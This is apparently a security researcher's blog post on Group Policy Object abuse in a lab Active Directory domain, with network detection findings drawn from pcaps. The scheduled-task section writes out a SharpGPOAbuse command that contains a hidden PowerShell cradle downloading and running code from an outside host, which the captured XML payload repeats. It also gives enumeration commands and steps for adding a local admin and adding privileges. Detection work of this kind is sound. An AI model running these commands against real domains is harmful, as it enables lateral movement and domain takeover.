This post is about showing basic usage of GPO abuse attack in an AD environment. This post will focus on network implications of the attack. I will go over simulation details and talk about my findings from source codes and pcaps to help identify attackers from the network perspective. 


### What is GPO?

To give short overview of what a GPO is, GPOs (Group Policy Object) contain sets of policies that affect users and computers under the linked OU (Organizational Unit). OU is basically a general purpose container that can be used to group other object classes such as users and computers. Examples of OUs are typically categorized as different departments in companies such as Finance, Engineering, Sales etc. 

Main purpose of GPO is for Administrators to easily maintain set of policies across different groups such as departments or sites. Examples of GPO usage are
- Enforce password length policies for employees
- Startup Antivirus software as users/computers start up
- Turn off computer displays after n-number of minutes
- Creating Scheduled Tasks
- Disable users from changing network configuration

Above examples are just a peak of an iceberg of what GPO can do,

which means it is also a great tool for attackers to tinker with in order to hack the domain.

I am going to skip over details about GPO such as GpLink Enforcement, Blocking inheritance, WMI filtering because those are out of scope for this blog post.  
To go more in depth about GPO here are some resources that I found to be helpful while making this post.

In regards to this post, I want to focus on basic GPO abuse from network perspective.


## Prep

I've setup my own lab with one DC and one workstation to simulate this attack. 

Here's a network diagram of current lab

![](assets/gpo_network_diagram.jpg)

GPO setup for the attack simulation

![](assets/4users.png)

I've created **F1 Users** OU which contains another OU called Finance. 

Finance OU contains 4 users (I know the setup may be unrealistic, but this is just a POC)

![](assets/gpo_gplink_value.png)

GPlink value = `{51461F5B-D5BE-42DA-B879-34DDF09BAC5F}`

GPLink Name = `Finance User GPO`

![](assets/gpo_setting_mistake.png)

Above shows a simple misconfiguration where a normal domain user `F1\John` owning a WRITE permission on a GPO object which we will abuse for the simulation


## [](#header-2) Scheduled Task

**Description**

> Scheduled Task attack as the name suggests is scheduling a task to be run repeatedly. This attack is possibly the easiest and fastest way an attacker could laterally move in the network via GPO. Let's dive into some details about the attack scenario


**Tools**
- Cobalt Strike
- SharpGPOAbuse
- PowerView

### Scenario

> Scenario begins with `F1\John` user being compromised. 

> Once the attacker has foothold in the Domain, the attacker begins with some discovery techniques to find out who has been compromised

>![](assets/getuid.png)

> Attacker then imports a handy tool PowerView (just for my simplicity TBH), and Converts username to SID for further Reconnaissance

> ![](assets/convert_name_to_sid.png)

> Once the SID is found, attacker enumerates GPOs in the domain and finds if the current user has any rights to existing GPOs

> ```powershell
get-domaingpo | get-objectacl | where SecurityIdentifier -eq "S-1-5-21-2941969941-1997400234-677688552-1106"
```

> ![](assets/gpo_identify_gpo_acl.png)

> Attacker finds a GPO which the current user has WriteProperty Right, and attacker continues to find which OU this GPO is linked to

> `get-domainou -gplink {gpoid}`

> ![](assets/gplink.png)

> Now the attacker knows which OU this writable GPO is linked to, attacker wants to know which users or computers are inside that OU.

> ```powershell
(get-domainsearcher -domain "f1.ad.lab.ch" -LdapFilter "objectclass=user" -searchbase "OU=Finance,OU=F1 Users,DC=f1,DC=ad,DC=lab,DC=ch").finadll() | where-object {$_} | ForEach-Object { write-output "$($_.properties.distinguishedname) - $((get-domaingroup -MemberIdentity $_.properties.distinguishedname | select-object -expandproperty samaccountname) -join ',')" }
```

> ![](assets/gpo_users.png)

> Based on the information above, we know that **andy lee** user is a Domain Admin which gives the attacker an easy path to compromise the Domain. Attacker can simply utilize Scheduled Task setting in User Policies in the GPO to create a scheduled task on all users under Finance OU

> ```powershell
execute-assembly /home/kali/Downloads/SharpGPOAbuse.exe --AddUserTask --TaskName "Evil Task" --Author F1\John --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://100.100.100.100:80/a'))"" --GPOName "Finance User GPO" 
```

> ![](assets/evil_task.png)

> Since GPO settings update every 90 minutes attacker can either wait 90 minutes until the setting propagates to other workstations or the attacker can force an update. For the sake of POC, attacker forced an update, and waited for `andy lee` to log in on DC

> ![](assets/andy_lee_login.png)

> Once Andy Lee logs in, Domain Admin is compromised

> ![](assets/da_compromised.png)



## Findings

### How can we find out when an attacker creates a Scheduled Task via GPO? 

Scheduled Task Creation via GPO is done by couple of steps 

1. SMB WRITE ScheduledTasks.xml file for chosen type (Computer/User)
2. SMB WRITE to update GPT.ini version
3. Update gPCExtensionName with values below 
```powershell
[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]
```
> More details about gPCExtensionName logic can be found 
- https://github.com/FuzzySecurity/StandIn/blob/main/StandIn/StandIn/Program.cs#L1174
- https://github.com/FSecureLABS/SharpGPOAbuse/blob/master/SharpGPOAbuse/Program.cs#L252


Based on three behaviors above, we can easily identify that someone writing to ScheduledTasks.xml can be suspicious. 

Let's check on our pcap to see where this occurs

Pcap - 2022-12-12-gpoproject.pcap 
Frame #7106

![](assets/scheduled_task_write.png)
![](assets/scheduled_task_treeconnect.png)

The write operation occurs at the Domain Controller's SYSVOL share which contains all the group policies

If we combine the TreeId with GUID handle, we get a full path below

```
\\f1-dc-01.f1.ad.lab.ch\Sysvol\f1.ad.lab.ch\Policies\{51461F5B-D5BE-42DA-B879-34DDF09BAC5F}\User\Preferences\ScheduledTasks\ScheduledTasks.xml
```

Thus, we can detect for anyone trying to do a write operation to ScheduledTasks.xml file

Plus, SMB_WRITE payload should contain all the necessary data such as what command the attacker were trying to run on the system. Below is the payload from the simulation from frame #7106

```xml
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">

						<Arguments>/c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://100.100.100.100:80/a'))"</Arguments>
					</Exec>
				</Actions>
			</Task>
		</Properties>
	</ImmediateTaskV2>
</ScheduledTasks>
```

As we can see above and as the filename suggests, it is an xml file which contains a lot of information, but what we are looking for is in `<Exec>` brackets. With this, we can extract the exact command being executed. 


### But what if the ScheduledTasks.xml already exists? 

There are two differences in the network behavior when the Scheduled Task already exists for that GPO

1. New file of ScheduledTasks.xml is not created only more scheduled tasks get appended to the end of the file
2. gPCExtensionName update may not happen because the extension names may have been already set by other Scheduled Tasks

Pcap - 2022-12-12-gpoproject.pcap - # 7150

![](assets/modify_scheduled_task_gpc.png)

Pcap - 2022-12-20-gpoproject-benign_scheduledtask.pcap - # 892

![](assets/new_scheduled_task_gpc.png)

Notice first pcap screenshot when creating a scheduled task for the first time, it modifies GPO via LDAP to update **version** and **GPCUserExtensionNames** (If Scheduled task was added to Machine Settings, it would be GPCMachineExtensionNames), but if scheduled task already exists, operation does not need to update **GPCUserExtensionNames** value because it already exists.

Why does this matter?

Well this is just a long way of saying that GPCExtensionName is not a good indicator of compromise

## Logon / StartUp Script

**Description**

> As the same suggests, this is planting a logon script where the script executes as soon as the user logs in. Very similar to Scheduled Task method. Let's dive right into some findings

**Tool**
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse/tree/d099eb9bc79059a2bfd25a30802bb73cf913d52f)


### Findings

As soon as the attacker creates a user logon script on a GPO, it creates a file in SYSVOL share

File Location - `\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\User\Scripts\Logon`
![](assets/logon_script_file_location.png)


If the attacker wants to rather use Computer Startup script, it will create the file under 

File Location - `\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\Machine\Scripts\Startup`
![](assets/machine_startup_script.png)

> Note - Computer Startup script will not work if computer account is not in the OU which vulnerable GPO is linked to. If you plan to try this in your lab, make sure you create at least one computer account in the vulnerable OU. 
![](assets/gpo_users_and_computers_view.png)


Along with script file, it also writes to scripts.ini file (if not created, creates a new one)

![](assets/scriptsini.png)

After both files are written via SMB, LDAP is used to modify version and GPCExtensionNames just like Scheduled Task operation above. 

I won't go into detail about GPCExtensionNames again. Although the values are different than ScheduledTask, this is not a good IOC to look for. 

Regarding detection logic from network, this one is easy

Just look for SMB WRITE to either 
`\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\User\Scripts\Logon`

or 

`\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\Machine\Scripts\Startup`


I did not simulate this scenario, but I suspect modifying existing startup script is also possible. Even then, from the network it should look the same --> SMB WRITE on those files are suspicious

For further details about what commands are being run, SMB WRITE payload should have that information.

## Add Local Admin

**Description**

> This attack is a bit different than other attacks. Attacker uses existing normal user as local admin of all computers under the vulnerable GPO. This allows attackers to elevate privilege from normal user to local admin on different machines. This can be a sneakier way of hacking without executing code on other computers. 

**Tools**
- [StandIn](https://github.com/FuzzySecurity/StandIn#gpo-add-local-admin)

### Findings

I used StandIn tool for adding local admin setting to GPO. 

The tool does few simple steps to add local admins to all computer accounts affected by this GPO
1. identifies the user SID 
2. SMB Writes GptTempl.inf file in Group Policy location
3. SMB Write to update Gpt.ini
4. Modify GpcExtensionNames and VersionNumber via LDAP

Core part of the attack is step 2, GptTemp.inf

File Location: `\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

![](assets/local_admin_added_to_gpttemplate.png)

Only way to find out from the network if someone added a new local admin to the GPO is by looking at the payload of SMB WRITE to GptTmpl.inf because other benign operations could be writing to this file as well. 

I would guess the easiest detection logic from the network would be something like a pseudo code below 
```
If (SMB WRITE on "\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf") {
    if (SMB.Write.Data.contains("[Group Membership]") and SMB.Write.Data.contains("S-1-5-32-544__Members = *S")) {
        return gpo_local_admin_addition_detection
    }
}
```

## Add User Rights

**Description**

> Privileges / Rights determine the type of system operations that a user account can perform. This attack grants a user with certain privileges via GPO.
For this attack to be useful, the attacker needs to know some of the privileges to take advantage of

**Findings**

There are a lot of privileges available to apply to users. Below are some examples 

| Name | Description |
|-|-|
| SeDebugPrivilege | Required to debug and adjust the memory of a process owned by another account. |
| SeBackupPrivilege | Required to perform backup operations. This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. |
| SeLoadDriverPrivilege | Required to load or unload a device driver |
| SeCreateTokenPrivilege | Required to create a primary token |
| SeRestorePrivilege | Required to perform restore operations. This privilege causes the system to grant all write access control to any file, regardless of the ACL specified for the file. |
| SeTakeOwnershipPrivilege | Required to take ownership of an object without being granted discretionary access |
| SeTcbPrivilege | This privilege identifies its holder as part of the trusted computer base. Some trusted protected subsystems are granted this privilege |

---
> Reference: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

This attack is almost identical to Add Local Admin attack in terms of technique. 

Technique simply writes list of privileges and user SID in GptTmpl just like Add Local Admin technique. 

For this particular simulation, I added two privileges to user yoyo (S-1-5-21-2941969941-1997400234-677688552-1108) **SeDebugPrivilege** and **SeLoadDriverPrivilege**

File Location: `\\{DC-IP}\SYSVOL\{domain}\Policies\{GPLink}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

![](assets/user_rights_gpttemplate_view.png)

In order to detect this properly, one must parse out the payload of SMB WRITE

Under `[Privilege Rights]` if a new SID is added to dangerous Rights such as `SeDebugPrivilege` or `SeLoadDriverPrivilege` or any other privileges that an attacker could take advantage of, that should be a flag

# Conclusion

Above techniques are technique combination of SharpGPOAbuse and StandIn tools. I simulated everything with these two tools, and they behave just about same manner. Because GPO settings all live in SYSVOL share of Domain Controller, the network behavior is very simple. There could be thousands of different tools to do this differently, but in the end, the network behavior should come down to be a SMB WRITE operation to Domain Controller's SYSVOL folder. I have yet encountered a different approach for above techniques. I would love to hear other opinions. Feel free to shoot me an email at soso-security@protonmail.com 

Afterall, thank you for reading my messy simulation notes and let me know if you need pcaps
